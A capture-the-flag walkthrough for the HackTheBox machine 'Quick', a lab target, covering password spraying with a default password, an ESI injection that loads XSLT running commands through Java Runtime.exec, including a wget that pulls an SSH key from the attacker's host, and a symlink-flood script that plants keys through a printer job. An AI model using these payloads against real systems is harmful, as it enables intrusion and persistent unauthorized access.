<p><strong>Machine:</strong> Quick<br /><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Linux<br /><strong>IP (Target):</strong> 10.129.2.152<br /><strong>IP (Attacker):</strong> 10.10.14.6  </p>

<h2 id="mindset-and-methodology">Mindset &amp; Methodology</h2>
<p>Before touching a single command, understand the <strong>hacker's mindset</strong> for this box:</p>
<blockquote>
<p><strong>"The box is called Quick. The name is a hint."</strong></p>
</blockquote>
<p>On HackTheBox, machine names are rarely random. "Quick" hints at speed, but more importantly, it hints at <strong>HTTP/3</strong> and the <strong>QUIC protocol</strong> — both designed for speed. When you see an HTTPS link that doesn't work on standard TCP port 443, you must ask: <em>"What if this isn't broken? What if it's just speaking a protocol I haven't checked yet?"</em></p>
<p>The core methodology for this box is:</p>
<ol>
<li><strong>Enumerate everything</strong> — even the weird stuff (UDP ports, non-standard protocols).</li>
<li><strong>Follow the breadcrumbs</strong> — PDFs, testimonials, and email addresses are not decoration; they are intel.</li>
<li><strong>Think like the developer</strong> — they reused passwords, left debug headers (<code>X-Powered-By: Esigate</code>), and stored credentials in config files.</li>
<li><strong>Use the path of least resistance</strong> — whenever possible, write your own access (SSH keys) instead of fighting with reverse shells.</li>
</ol>
<hr />
<h2 id="phase-1-enumeration">Phase 1: Enumeration</h2>
<h3 id="step-1-1-hosts-file-setup">Step 1.1: Hosts File Setup</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo -e "10.129.2.152\tquick.htb portal.quick.htb printerv2.quick.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why:</strong><br />Web applications often use <strong>virtual hosts</strong> (vhosts). If you access a site by IP address alone, Apache/nginx serves the <em>default</em> virtual host. To reach <code>portal.quick.htb</code> or <code>printerv2.quick.htb</code>, your OS must resolve those domains to the target IP. Without this, you'll hit the wrong site or get connection errors.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Always map domains early.</em> The moment you see a link to <code>portal.quick.htb</code> on the main page, that domain becomes a target. Don't wait until you need it — set it up during initial recon.</p>
<hr />
<h3 id="step-1-2-nmap-what-we-expect">Step 1.2: Nmap (What We Expect)</h3>
<p>A standard <code>nmap -sC -sV</code> scan reveals:</p>
<ul>
<li><strong>Port 22/tcp</strong> — SSH (OpenSSH 7.6p1)</li>
<li><strong>Port 9001/tcp</strong> — Apache httpd 2.4.29</li>
</ul>
<p><strong>Why:</strong><br />Port 9001 is non-standard for HTTP. This tells us the admin deliberately chose not to use port 80/8080. Why? Probably to hide something, or because port 80 is reserved for an internal service (spoiler: it is).</p>
<p><strong>Hacker Mindset:</strong><br /><em>Non-standard ports are invitations to dig deeper.</em> They suggest custom configuration, potential misconfiguration, or hidden services. Also, SSH on port 22 is "boring" until you have credentials — so prioritize the webapp.</p>
<hr />
<h3 id="step-1-3-the-broken-https-link">Step 1.3: The Broken HTTPS Link</h3>
<p>Browsing <code>http://quick.htb:9001</code>, you see a link to <code>https://portal.quick.htb</code>. Clicking it fails. TCP port 443 is not open in your nmap scan.</p>
<p><strong>Why:</strong><br />Browsers speak HTTP over TCP. If the server only speaks HTTP/3 (which uses <strong>UDP</strong>), the browser cannot connect. The box name "Quick" + a broken HTTPS link = <strong>QUIC/HTTP/3</strong>.</p>
<p><strong>Hacker Mindset:</strong><br /><em>When something looks broken, ask if you're speaking the wrong language.</em> The site isn't broken; your tools are. This is a critical pivot point. Most attackers give up here. You won't.</p>
<hr />
<h3 id="step-1-4-udp-scan">Step 1.4: UDP Scan</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo nmap -sU -p 443 10.129.2.152
</code></pre>
<p><strong>Result:</strong><br />UDP port 443 is <code>open|filtered</code>.</p>
<p><strong>Why:</strong><br />Nmap's default is TCP. UDP scans are slower and often ignored, but HTTP/3 (QUIC) explicitly uses <strong>UDP 443</strong>. This confirms our hypothesis.</p>
<p><strong>Hacker Mindset:</strong><br /><em>TCP is not the only protocol.</em> Modern applications (DNS, QUIC, VPNs) live on UDP. If a box feels "empty" after a TCP scan, you're not done. The best hints are often on UDP.</p>
<hr />
<h3 id="step-1-5-accessing-http-3-with-curl">Step 1.5: Accessing HTTP/3 with curl</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">curl --http3 -k https://portal.quick.htb/
</code></pre>
<p><strong>Why:</strong><br />Modern curl (8.x+) ships with <code>ngtcp2</code> and <code>nghttp3</code>, enabling native HTTP/3 support. The <code>--http3</code> flag forces curl to speak QUIC. <code>-k</code> ignores the self-signed certificate. Without this, you cannot reach the portal.</p>
<p><strong>Result:</strong><br />The portal loads. Inside:</p>
<ul>
<li><code>index.php?view=about</code> → reveals email addresses (<code>jane@quick.htb</code>, <code>mike@quick.htb</code>, <code>john@quick.htb</code>)</li>
<li><code>index.php?view=docs</code> → links to PDFs: <code>QuickStart.pdf</code> and <code>Connectivity.pdf</code></li>
</ul>
<p><strong>Hacker Mindset:</strong><br /><em>Use the right tool for the protocol.</em> Don't spend hours compiling <code>quiche</code> or <code>aioquic</code> if your system curl already supports HTTP/3. Check your tools first.</p>
<hr />
<h3 id="step-1-6-downloading-and-analyzing-pdfs">Step 1.6: Downloading and Analyzing PDFs</h3>
<p><strong>Commands:</strong></p>
<pre><code class="language-bash" data-language="bash">curl --http3 -k https://portal.quick.htb/docs/Connectivity.pdf -o /tmp/Connectivity.pdf
pdftotext /tmp/Connectivity.pdf -
</code></pre>
<p><strong>Result:</strong><br />The PDF contains the default customer password: <strong>REDACTED</strong></p>
<p><strong>Why:</strong><br />Documentation, onboarding PDFs, and "getting started" guides are goldmines. Companies often include default credentials, WiFi passwords, or internal URLs. Never skip the boring documents.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Users are lazy.</em> If the ISP gives customers a default password, at least one customer hasn't changed it. Our job is to find that customer.</p>
<hr />
<h3 id="step-1-7-building-a-user-list">Step 1.7: Building a User List</h3>
<p>From the main site (<code>http://quick.htb:9001</code>):</p>
<ul>
<li><strong>Testimonials</strong> reveal names + companies:<ul>
<li>Tim (Qconsulting Pvt Ltd) — UK</li>
<li>Roy (DarkWng Solutions) — US</li>
<li>Elisa (Wink Media) — UK</li>
<li>James (LazyCoop Pvt Ltd) — China</li>
</ul>
</li>
<li><strong>Clients page</strong> confirms countries.</li>
</ul>
<p><strong>Email candidates:</strong></p>
<pre><code>elisa@wink.co.uk
tim@Qconsulting.co.uk
james@lazycoop.co.cn
roy@DarkWng.com
jane@quick.htb
mike@quick.htb
john@quick.htb
</code></pre>
<p><strong>Why:</strong><br />The testimonials and client list are not fluff. They provide <strong>real names</strong> and <strong>company domains</strong>. Correlating country + company + name lets us guess email formats. The UK pricing (£) suggests UK TLDs (<code>.co.uk</code>) are most likely.</p>
<p><strong>Hacker Mindset:</strong><br /><em>OSINT is enumeration.</em> You don't need a vulnerability to break in if you can guess a valid username. Social engineering and pattern matching are legitimate attack vectors.</p>
<hr />
<h3 id="step-1-8-password-spraying">Step 1.8: Password Spraying</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -D - -X POST -d 'email=elisa@wink.co.uk&amp;password=REDACTED http://quick.htb:9001/login.php
</code></pre>
<p><strong>Result:</strong><br />HTTP 302 Found with <code>Set-Cookie: null</code></p>
<p><strong>Why:</strong><br />Instead of brute-forcing thousands of passwords against one user, we try <strong>one password against many users</strong>. This is called <strong>password spraying</strong>. It's stealthy and effective because users reuse passwords.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Work smart, not hard.</em> One correct guess is worth more than a million wrong guesses. Default passwords work more often than you'd think.</p>
<hr />
<h3 id="step-1-9-discovering-the-esi-header">Step 1.9: Discovering the ESI Header</h3>
<p>While proxying requests through Burp, notice:</p>
<pre><code>X-Powered-By: Esigate
</code></pre>
<p><strong>Why:</strong><br /><code>Esigate</code> is a web application integration gateway that supports <strong>Edge Side Includes (ESI)</strong>. ESI allows dynamic assembly of web pages from multiple sources. If user input is reflected into an ESI-enabled response, we can inject ESI tags to make the server fetch and execute arbitrary resources.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Unusual headers are cheat codes.</em> <code>X-Powered-By</code> often reveals the exact software and version. When you see something you've never heard of, Google it immediately. Every unknown technology is a potential vulnerability.</p>
<hr />
<h2 id="phase-2-initial-foothold-user">Phase 2: Initial Foothold (User)</h2>
<h3 id="step-2-1-understanding-esi-injection">Step 2.1: Understanding ESI Injection</h3>
<p>ESI tags look like XML:</p>
<pre><code class="language-xml" data-language="xml">&lt;esi:include src="http://attacker.com/evil.xml" stylesheet="http://attacker.com/evil.xsl"/&gt;
</code></pre>
<p><strong>Why it works:</strong><br />When Esigate parses this tag, it fetches <code>evil.xml</code> and applies the XSL stylesheet <code>evil.xsl</code>. The XSL can contain executable code using Java extensions (<code>java.lang.Runtime</code>), giving us <strong>Remote Code Execution (RCE)</strong>.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Abuse the parser.</em> The server trusts ESI tags because they're supposed to be internal. If you can inject them into user-facing content (like a ticket description), the server becomes your puppet.</p>
<hr />
<h3 id="step-2-2-preparing-the-payload-server">Step 2.2: Preparing the Payload Server</h3>
<p><strong>Commands:</strong></p>
<pre><code class="language-bash" data-language="bash">mkdir -p /tmp/quick_exploit
cp ~/.ssh/quick_rsa.pub /tmp/quick_exploit/
cd /tmp/quick_exploit &amp;&amp; python3 -m http.server 8000 &gt; /dev/null 2&gt;&amp;1 &amp;
</code></pre>
<p><strong>Why:</strong><br />The target needs to fetch our malicious XML/XSL files and our SSH public key. A simple Python HTTP server on our attack box is the fastest way to serve these.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Always prepare your infrastructure before firing the exploit.</em> You don't want to scramble to start a server while your payload is already in flight.</p>
<hr />
<h3 id="step-2-3-generating-an-ssh-keypair">Step 2.3: Generating an SSH Keypair</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">ssh-keygen -t rsa -f ~/.ssh/quick_rsa -N ""
</code></pre>
<p><strong>Why:</strong><br />Instead of fighting with reverse shells (which often die, have no TTY, or fail behind firewalls), we <strong>write our own access</strong>. Dropping an SSH public key into a user's <code>authorized_keys</code> gives us a stable, interactive shell.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Prefer persistent access over one-shot shells.</em> A reverse shell is a conversation; an SSH key is a key to the house. Always choose the latter when possible.</p>
<hr />
<h3 id="step-2-4-crafting-the-xsl-payloads">Step 2.4: Crafting the XSL Payloads</h3>
<p>We need <strong>two separate tickets</strong> because <code>Runtime.exec()</code> chokes on complex shell syntax like <code>&amp;&amp;</code> and pipes. Simple commands work.</p>
<p><strong>Ticket 1 — Create the <code>.ssh</code> directory:</strong></p>
<pre><code class="language-xml" data-language="xml">&lt;?xml version="1.0" ?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
&lt;xsl:template match="/"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
  &lt;root&gt;
    &lt;xsl:variable name="cmd"&gt;&lt;![CDATA[mkdir -p /home/sam/.ssh]]&gt;&lt;/xsl:variable&gt;
    &lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
    &lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
    Process: &lt;xsl:value-of select="$process"/&gt;
  &lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre>
<p><strong>Ticket 2 — Download the SSH key:</strong></p>
<pre><code class="language-xml" data-language="xml">&lt;?xml version="1.0" ?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
&lt;xsl:output method="xml" omit-xml-declaration="yes"/&gt;
&lt;xsl:template match="/"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"&gt;
  &lt;root&gt;
    &lt;xsl:variable name="cmd"&gt;&lt;![CDATA[wget http://10.10.14.6:8000/quick_rsa.pub -O /home/sam/.ssh/authorized_keys]]&gt;&lt;/xsl:variable&gt;
    &lt;xsl:variable name="rtObj" select="rt:getRuntime()"/&gt;
    &lt;xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/&gt;
    Process: &lt;xsl:value-of select="$process"/&gt;
  &lt;/root&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre>
<p><strong>Why:</strong><br />The <code>xmlns:rt</code> namespace imports <code>java.lang.Runtime</code>. <code>rt:getRuntime()</code> gets the runtime object, and <code>rt:exec()</code> executes a system command. The CDATA section protects special XML characters.</p>
<p><strong>Critical Lesson:</strong><br />We initially tried <code>bash -c "mkdir -p /home/sam/.ssh &amp;&amp; wget ..."</code> but <code>Runtime.exec()</code> tokenizes arguments differently than a shell. Pipes, redirects, and <code>&amp;&amp;</code> break. <strong>Simple commands only.</strong></p>
<p><strong>Hacker Mindset:</strong><br /><em>Know your execution context.</em> A command that works in <code>bash</code> may fail in <code>Runtime.exec()</code>, <code>system()</code>, or <code>execve()</code>. Test simple primitives first.</p>
<hr />
<h3 id="step-2-5-submitting-malicious-tickets">Step 2.5: Submitting Malicious Tickets</h3>
<p><strong>Ticket 1:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' -X POST \
  -d 'title=mkdir&amp;msg=&lt;esi:include src="http://10.10.14.6:8000/mkdir.xml" stylesheet="http://10.10.14.6:8000/mkdir.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-7332' \
  http://quick.htb:9001/ticket.php
</code></pre>
<p><strong>Trigger Ticket 1:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' 'http://quick.htb:9001/search.php?search=7332'
</code></pre>
<p><strong>Ticket 2:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' -X POST \
  -d 'title=wget&amp;msg=&lt;esi:include src="http://10.10.14.6:8000/wget.xml" stylesheet="http://10.10.14.6:8000/wget.xsl"&gt;&lt;/esi:include&gt;&amp;id=TKT-7333' \
  http://quick.htb:9001/ticket.php
</code></pre>
<p><strong>Trigger Ticket 2:</strong></p>
<pre><code class="language-bash" data-language="bash">curl -s -b 'PHPSESSID=YOUR_COOKIE' 'http://quick.htb:9001/search.php?search=7333'
</code></pre>
<p><strong>Why:</strong><br />The ticket submission stores the ESI payload in the database. The <strong>search</strong> function retrieves the ticket and reflects it into the page. Esigate parses the ESI tag, fetches our XSL, and executes the command.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Find the reflection point.</em> Stored XSS/ESI is useless until it's rendered. The search page is the trigger.</p>

<h3 id="step-2-6-ssh-as-sam">Step 2.6: SSH as Sam</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">ssh -i ~/.ssh/quick_rsa sam@quick.htb
</code></pre>
<p><strong>Result:</strong><br />Shell as <code>sam</code>. Grab the user flag:</p>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
</code></pre>
<p><strong>Why:</strong><br />Stable shell, full TTY, no netcat juggling. This is the reward for choosing the SSH key route.</p>

<h2 id="phase-3-privilege-escalation-to-srvadm">Phase 3: Privilege Escalation to srvadm</h2>
<h3 id="step-3-1-mysql-enumeration">Step 3.1: MySQL Enumeration</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">cat /var/www/html/db.php
</code></pre>
<p><strong>Result:</strong></p>
<pre><code class="language-php" data-language="php">$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
</code></pre>
<p><strong>Why:</strong><br />Database credentials are often hardcoded in PHP includes. <code>db.php</code> is a classic target. Once you have DB access, you own the application's authentication layer.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Config files are confessionals.</em> Developers store secrets in plain text because it's convenient. Always grep for <code>password</code>, <code>secret</code>, and <code>key</code> in web roots.</p>
<hr />
<h3 id="step-3-2-extracting-srvadm-s-hash">Step 3.2: Extracting srvadm's Hash</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">mysql -u db_adm -p REDACTED -e "select email,password from users where email='srvadm@quick.htb';"
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>| srvadm@quick.htb | [redacted retired-lab hash or flag] |
</code></pre>
<p><strong>Why:</strong><br />The <code>users</code> table contains password hashes. For <code>srvadm</code>, the hash is <code>[redacted retired-lab hash or flag]</code>. The login logic uses <code>md5(crypt($password,'fa'))</code>.</p>
<p><strong>Important Distinction:</strong><br />This is the <strong>web application password</strong>, not the Linux system password. <code>su srvadm</code> uses <code>/etc/shadow</code>, which is different. We cannot <code>su</code> with this password. But we <em>can</em> use it to login to the printer management interface.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Distinguish application credentials from OS credentials.</em> Just because a password unlocks a web app doesn't mean it unlocks the shell. Map each credential to its scope.</p>
<hr />
<h3 id="step-3-3-accessing-the-internal-printer-interface">Step 3.3: Accessing the Internal Printer Interface</h3>
<p>From Apache config (<code>/etc/apache2/sites-enabled/000-default.conf</code>):</p>
<pre><code class="language-apache" data-language="apache">&lt;VirtualHost *:80&gt;
    AssignUserId srvadm srvadm
    ServerName printerv2.quick.htb
    DocumentRoot /var/www/printer
&lt;/VirtualHost&gt;
</code></pre>
<p><strong>Why:</strong><br />Port 80 is only bound to <code>127.0.0.1</code>. From our shell as <code>sam</code>, we can access it via <code>curl -H 'Host: printerv2.quick.htb' http://127.0.0.1:80/</code>. The <code>AssignUserId srvadm srvadm</code> directive means this vhost runs as <code>srvadm</code> — critical for privilege escalation.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Internal services are soft targets.</em> Just because a port isn't exposed externally doesn't mean it's secure. Once you're inside, localhost becomes a goldmine.</p>
<hr />
<h3 id="step-3-4-understanding-the-printer-exploit">Step 3.4: Understanding the Printer Exploit</h3>
<p>The printer interface (<code>/var/www/printer/job.php</code>) does the following:</p>
<pre><code class="language-php" data-language="php">$file = date("Y-m-d_H:i:s");
file_put_contents("/var/www/jobs/".$file, $_POST["desc"]);
chmod("/var/www/printer/jobs/".$file, "0777");  // BUG: wrong path!
$stmt = $conn-&gt;prepare("select ip,port from jobs");
...
$printer -&gt; text(file_get_contents("/var/www/jobs/".$file));
...
unlink("/var/www/jobs/".$file);
</code></pre>
<p><strong>The Bug:</strong><br /><code>file_put_contents</code> writes to <code>/var/www/jobs/</code>, but <code>chmod</code> tries <code>/var/www/printer/jobs/</code> (which doesn't exist). The file is created with default permissions.</p>
<p><strong>The Exploit:</strong><br /><code>/var/www/jobs</code> is <strong>world-writable</strong> (<code>drwxrwxrwx</code>). If we create a <strong>symlink</strong> in <code>/var/www/jobs/</code> with the same name as the timestamp <code>job.php</code> will use, <code>file_put_contents</code> will <strong>follow the symlink</strong> and write our data to wherever it points.</p>
<p>We point the symlink to <code>/home/srvadm/.ssh/authorized_keys</code>. When the admin submits a print job containing our SSH public key, our key gets written to srvadm's authorized keys.</p>
<p><strong>Why this works:</strong><br /><code>file_put_contents()</code> follows symlinks. The write happens <strong>before</strong> the network connection to the printer. Even if the printer is offline, the write succeeds.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Race conditions favor the prepared.</em> Instead of trying to swap the file after creation (which is a narrow window), we <strong>pre-place</strong> symlinks for every second in the next minute. When the job fires, one of our symlinks matches the timestamp. We turn a race into a near-certainty.</p>
<hr />
<h3 id="step-3-5-executing-the-symlink-flood-print-job">Step 3.5: Executing the Symlink Flood + Print Job</h3>
<p><strong>On the target (as <code>sam</code>):</strong></p>
<pre><code class="language-bash" data-language="bash"># Login to printer interface
curl -s -c /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST -d 'email=srvadm@quick.htb&amp;password=REDACTED \
  http://127.0.0.1:80/index.php

# Add a fake printer pointing back to our Kali box
curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST -d 'title=hack&amp;type=network&amp;profile=default&amp;ip_address=10.10.14.6&amp;port=9100&amp;add_printer=' \
  http://127.0.0.1:80/add_printer.php

# Download our public key locally on the target
wget -qO /tmp/key.pub http://10.10.14.6:8000/quick_rsa.pub

# Flood /var/www/jobs with symlinks for every second in the next 60 seconds
for i in $(seq 0 59); do
  t=$(date -d "+$i seconds" +"%Y-%m-%d_%H:%M:%S")
  ln -sf /home/srvadm/.ssh/authorized_keys /var/www/jobs/$t
done

# Submit the print job with our key as the "document"
curl -s -b /tmp/printer_cookies.txt -H 'Host: printerv2.quick.htb' \
  -X POST --data-urlencode "title=hack" \
  --data-urlencode "desc@/tmp/key.pub" \
  --data-urlencode "submit=Print" \
  http://127.0.0.1:80/job.php
</code></pre>
<p><strong>Result:</strong><br />The job returns "Can't connect to printer" (because our Kali box isn't listening on 9100), but <code>file_put_contents</code> has already executed. The key is now in <code>/home/srvadm/.ssh/authorized_keys</code>.</p>
<p><strong>Hacker Mindset:</strong><br /><em>You don't need the printer to work; you only need the file write.</em> Error messages are noise. Focus on the side effects.</p>
<hr />
<h3 id="step-3-6-ssh-as-srvadm">Step 3.6: SSH as srvadm</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">ssh -i ~/.ssh/quick_rsa srvadm@quick.htb
</code></pre>
<p><strong>Result:</strong><br />Shell as <code>srvadm</code>.</p>
<p><strong>Why:</strong><br />The symlink trick gave us write access to srvadm's <code>authorized_keys</code> because the printer job ran as <code>srvadm</code> (per the Apache <code>AssignUserId</code> directive).</p>
<p><strong>Hacker Mindset:</strong><br /><em>Abuse process identity.</em> When a service runs as a specific user, any file operation it performs inherits that user's privileges. If you can control the filename (via symlink), you control where the data lands.</p>
<hr />
<h2 id="phase-4-root">Phase 4: Root</h2>
<h3 id="step-4-1-finding-the-root-password">Step 4.1: Finding the Root Password</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">cat ~/.cache/conf.d/printers.conf
</code></pre>
<p><strong>What we find:</strong></p>
<pre><code>DeviceURI https://srvadm%40quick.htb:REDACTED@printerv3.quick.htb/printer
</code></pre>
<p><strong>Decoding:</strong></p>
<ul>
<li><code>%40</code> → <code>@</code></li>
<li><code>%26</code> → <code>&amp;</code></li>
<li><code>%3F</code> → <code>?</code></li>
</ul>
<p><strong>Decoded URL:</strong></p>
<pre><code>https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
</code></pre>
<p><strong>Why:</strong><br />In URL syntax, <code>https://username:REDACTED@host/path</code> embeds credentials. The printer configuration file contains the plaintext password for <code>printerv3.quick.htb</code>. The username is <code>srvadm@quick.htb</code> and the password is REDACTED.</p>
<p><strong>Hacker Mindset:</strong><br /><em>Config files are the gift that keeps on giving.</em> Even after you've compromised a user, always grep their home directory for <code>.conf</code>, <code>.ini</code>, <code>.xml</code>, and cache files. Admins often reuse passwords across services.</p>
<hr />
<h3 id="step-4-2-becoming-root">Step 4.2: Becoming Root</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">su - root
</code></pre>
<p><strong>Password:</strong> REDACTED</p>
<p><strong>Result:</strong><br />Root shell.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">cat /root/root.txt
</code></pre>
<p><strong>Hacker Mindset:</strong><br /><em>Password reuse is the ultimate shortcut.</em> The root password was sitting in a printer config file, URL-encoded but otherwise naked. Once you find one password, always try it everywhere — especially <code>su</code>, <code>sudo</code>, and other services.</p>
